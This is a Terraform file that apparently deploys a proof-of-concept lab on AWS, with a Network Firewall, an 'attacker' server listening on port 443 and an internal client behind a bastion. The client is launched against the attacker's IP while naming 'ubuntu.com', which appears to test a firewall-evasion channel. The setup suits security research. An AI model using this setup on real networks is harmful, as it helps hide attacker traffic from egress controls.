
###########################################################
# Build the PoC binaries.
###########################################################

resource "null_resource" "make_build" {
  provisioner "local-exec" {
    command = "make build"
    working_dir = "${path.module}/../"
  }

  depends_on = [
    aws_networkfirewall_firewall.main,
  ]
}

###########################################################
# Add scripts to the attacker host.
###########################################################

resource "null_resource" "push_server" {
  provisioner "local-exec" {
    command = "./scripts/attacker-service-upload.sh"
  }

  depends_on = [
    aws_networkfirewall_firewall.main,
    null_resource.make_build,
    aws_instance.attacker_service,
    local_file.service_upload,
  ]
}

resource "null_resource" "server_run_script" {
  provisioner "remote-exec" {
    inline = [
      "cat << 'EOF' > /home/${local.ami_user}/run-server.sh",
      "#!/bin/bash",
      "sudo ./server 0.0.0.0 443",
      "EOF",
      "chmod +x /home/ec2-user/run-server.sh"
    ]

    connection {
      type        = "ssh"
      host        = aws_instance.attacker_service.public_ip
      user        = local.ami_user
      private_key = file(local_file.private_key.filename)
    }
  }

  depends_on = [
    aws_networkfirewall_firewall.main,
    aws_instance.attacker_service,
    null_resource.push_server,
  ]
}

###########################################################
# Add scripts to the client host.
###########################################################

resource "null_resource" "push_client" {
  provisioner "local-exec" {
    command = "./scripts/internal-client-upload.sh"
  }

  depends_on = [
    aws_networkfirewall_firewall.main,
    null_resource.make_build,
    aws_instance.internal_instance,
    local_file.internal_client_upload,
  ]
}

resource "null_resource" "client_run_script" {

  provisioner "remote-exec" {
    inline = [
      "cat << 'EOF' > /home/${local.ami_user}/run-client.sh",
      "#!/bin/bash",
      "./client https://${aws_instance.attacker_service.public_ip} ubuntu.com",
      "EOF",
      "chmod +x /home/ec2-user/run-client.sh"
    ]

    connection {
      type        = "ssh"

      bastion_host        = aws_instance.jumpbox_instance.public_ip
      bastion_user        = local.ami_user
      bastion_private_key = file(local_file.private_key.filename)

      host        = aws_instance.internal_instance.private_ip
      user        = local.ami_user
      private_key = file(local_file.private_key.filename)
    }
  }

  depends_on = [
    aws_networkfirewall_firewall.main,
    aws_instance.internal_instance,
    null_resource.push_client,
  ]
}
